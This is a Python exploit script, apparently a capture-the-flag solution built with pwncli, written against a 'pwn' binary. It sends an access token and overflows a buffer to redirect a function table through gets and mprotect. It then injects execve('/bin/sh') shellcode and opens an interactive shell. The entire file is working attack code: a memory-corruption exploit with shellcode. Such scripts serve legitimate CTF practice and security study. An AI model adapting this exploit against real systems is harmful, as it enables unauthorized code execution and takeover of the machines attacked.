#!/usr/bin/env python3
#-*- coding: utf-8 -*-
#   expBy : @eastXueLian
#   Debug : ./exp.py debug  ./pwn -t -b b+0xabcd
#   Remote: ./exp.py remote ./pwn ip:port

from pwncli import *
cli_script()
#  set_remote_libc('libc.so.6')
context.arch = "amd64"

io: tube = gift.io
elf: ELF = gift.elf
libc: ELF = gift.libc

i2b = lambda c : str(c).encode()
lg = lambda s : log.info('\033[1;31;40m %s --> 0x%x \033[0m' % (s, eval(s)))
debugB = lambda : input("\033[1m\033[33m[ATTACH ME]\033[0m")

# one_gadgets: list = get_current_one_gadget_from_libc(more=False)
CurrentGadgets.set_find_area(find_in_elf=True, find_in_libc=False, do_initial=False)

def cmd(data):
    ru(b'cmd> ')
    sl(data)
def call_func(data, idx=0, key=b""):
    cmd(data)
    ru(b'offset: ')
    sl(i2b(idx))
    if data[:1] == b"1":
        ru(b'data: ')
        sl(key)

ru(b":")
sl(b"17:MEUCIFtZ0Xqk5CauMwvYNQClJbNoG1bSMwpNLmbZCcAslJ+yAiEA9vQFGEWs9V0MpLGAWEbmgtJFRkpgzBH03sDXe6gys/g=")

buf_addr = 0x4c5000 + 8
gets_addr = elf.symbols['gets']
lg("gets_addr")
mprotect_addr = elf.symbols['mprotect']
lg("mprotect_addr")
bytes_binsh = u64_ex(b"/bin/sh\x00")
call_func(b"0\x00".ljust(0xf8, b"\x00") + p64(buf_addr) + p64(gets_addr) + p64(mprotect_addr))
# -1 => shellcode
#  0 => gets
#  1 => mprotect

shellcode = b"a"*8
shellcode += asm(f"""
    // execve(b"/bin/sh\x00", 0, 0);
    mov rax, {bytes_binsh};
    push rax;
    mov rdi, rsp;
    xor rsi, rsi;
    xor rdx, rdx;
    push SYS_execve;
    pop rax;
    syscall;
""")
sl(shellcode)
call_func(i2b(1), 0x1000, b"a"*7)
call_func(i2b(-1))

ia()
